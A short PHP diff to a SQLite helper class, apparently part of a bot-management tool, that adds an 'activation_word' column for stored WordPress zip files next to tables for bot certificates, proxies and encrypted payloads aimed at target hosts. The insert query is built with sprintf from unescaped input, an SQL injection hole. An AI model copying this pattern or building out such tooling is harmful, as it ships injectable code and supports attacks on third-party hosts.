@@ -37,7 +37,7 @@ class slopSqlite extends \SQLite3
             "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,cert_location_on_disk TEXT UNIQUE NOT NULL,base64_encoded_cert TEXT UNIQUE NOT NULL,csr TEXT UNIQUE,pub TEXT UNIQUE,pem TEXT UNIQUE,cipher TEXT DEFAULT '-',is_encrypted BOOLEAN DEFAULT FALSE,priv_key_pass TEXT UNIQUE NOT NULL,rotated BOOLEAN NOT NULL DEFAULT FALSE);",
             "proxies" => "CREATE TABLE IF NOT EXISTS sloppy_bots_proxies(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,proxy_schema TEXT NOT NULL DEFAULT '-',proxy TEXT UNIQUE NOT NULL,times_used INTEGER NOT NULL DEFAULT 0,last_domain_contacted TEXT NOT NULL DEFAULT '-',proxy_still_viable BOOLEAN NOT NULL DEFAULT TRUE,round_trip_time INTEGER NOT NULL DEFAULT 0,time_outs INTEGER NOT NULL DEFAULT 0,successful_responses INTEGER NOT NULL DEFAULT 0);",
             "deployer" => "CREATE TABLE IF NOT EXISTS sloppy_deployer(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,encrypted_contents TEXT NOT NULL,pem_used TEXT NOT NULL DEFAULT 'NONE',targeted_host TEXT NOT NULL);",
-            "wordpress" => "CREATE TABLE IF NOT EXISTS sloppy_wordpress(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, zip_file TEXT NOT NULL)"
+            "wordpress" => "CREATE TABLE IF NOT EXISTS sloppy_wordpress(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, zip_file TEXT NOT NULL, activation_word TEXT UNIQUE NOT NULL)"
         ];
         foreach ($prepare_tables as $table => $createCall) {
             if ($this->exec($createCall) === true) {
@@ -51,7 +51,7 @@ class slopSqlite extends \SQLite3
     public function insertData(array $data): bool{
         switch ($data["action"]){
             case str_contains($data['action'], "add_press") !== false:
-                $this->exec(sprintf("INSERT INTO sloppy_wordpress(zip_file) VALUES ('%s');", $data['zip']));
+                $this->exec(sprintf("INSERT INTO sloppy_wordpress(zip_file, activation_word) VALUES ('%s', '%s');", $data['zip'], $data['activator']));
                 return true;
             case str_contains($data['action'], "add_bot"):
                 try{
